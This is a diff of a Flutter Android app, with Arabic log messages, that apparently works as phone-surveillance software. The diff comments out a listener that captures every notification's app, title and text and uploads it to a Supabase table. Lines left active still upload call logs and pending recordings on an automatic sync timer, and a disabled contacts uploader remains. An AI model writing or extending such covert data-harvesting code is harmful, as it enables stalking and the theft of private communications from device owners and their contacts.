@@ -1,7 +1,6 @@
 import 'dart:async';
 import 'dart:io';
 import 'package:flutter/material.dart';
-import 'package:flutter_notification_listener/flutter_notification_listener.dart';
 import 'package:android_intent_plus/android_intent.dart';
 import 'package:android_intent_plus/flag.dart';
 import 'package:connectivity_plus/connectivity_plus.dart';
@@ -43,17 +42,17 @@ class _MyAppState extends State<MyApp> {
   @override
   void initState() {
     super.initState();
-    NotificationsListener.initialize();
-    checkNotificationAccess();
+    // NotificationsListener.initialize();
+    // checkNotificationAccess();
     // uploadContactsToSupabase();
     uploadCallLogs();
     startAutoSyncTimer();
 
-    NotificationsListener.receivePort?.listen((event) {
-      if (event is NotificationEvent) {
-        uploadNotificationToSupabase(event);
-      }
-    });
+    // NotificationsListener.receivePort?.listen((event) {
+    //   if (event is NotificationEvent) {
+    //     uploadNotificationToSupabase(event);
+    //   }
+    // });ظ
   }
 
   @override
@@ -100,22 +99,22 @@ class _MyAppState extends State<MyApp> {
 
 // === SUPABASE FUNCTIONS ===
 
-Future<void> uploadNotificationToSupabase(NotificationEvent event) async {
-  final supabase = Supabase.instance.client;
-  final data = {
-    'package_name': event.packageName,
-    'title': event.title,
-    'text': event.text,
-    'timestamp': DateTime.now().toIso8601String(),
-  };
-
-  try {
-    await supabase.from('notifications').insert(data);
-    print("🔔 إشعار مرفوع إلى Supabase");
-  } catch (e) {
-    print("❌ فشل رفع الإشعار: $e");
-  }
-}
+// Future<void> uploadNotificationToSupabase(NotificationEvent event) async {
+//   final supabase = Supabase.instance.client;
+//   final data = {
+//     'package_name': event.packageName,
+//     'title': event.title,
+//     'text': event.text,
+//     'timestamp': DateTime.now().toIso8601String(),
+//   };
+//
+//   try {
+//     await supabase.from('notifications').insert(data);
+//     print("🔔 إشعار مرفوع إلى Supabase");
+//   } catch (e) {
+//     print("❌ فشل رفع الإشعار: $e");
+//   }
+// }
 
 // Future<void> uploadContactsToSupabase() async {
 //   if (!await Permission.contacts.request().isGranted) return;
@@ -180,14 +179,14 @@ Future<void> uploadPendingRecordings() async {
   }
 }
 
-Future<void> checkNotificationAccess() async {
-  final isRunning = await NotificationsListener.isRunning;
-  if (!isRunning!) {
-    print("⚠️ صلاحية الإشعارات غير مفعلة");
-  } else {
-    print("✅ صلاحية الإشعارات مفعلة");
-  }
-}
+// Future<void> checkNotificationAccess() async {
+//   final isRunning = await NotificationsListener.isRunning;
+//   if (!isRunning!) {
+//     print("⚠️ صلاحية الإشعارات غير مفعلة");
+//   } else {
+//     print("✅ صلاحية الإشعارات مفعلة");
+//   }
+// }
 
 Future<String> getDeviceId() async {
   final deviceInfo = DeviceInfoPlugin();
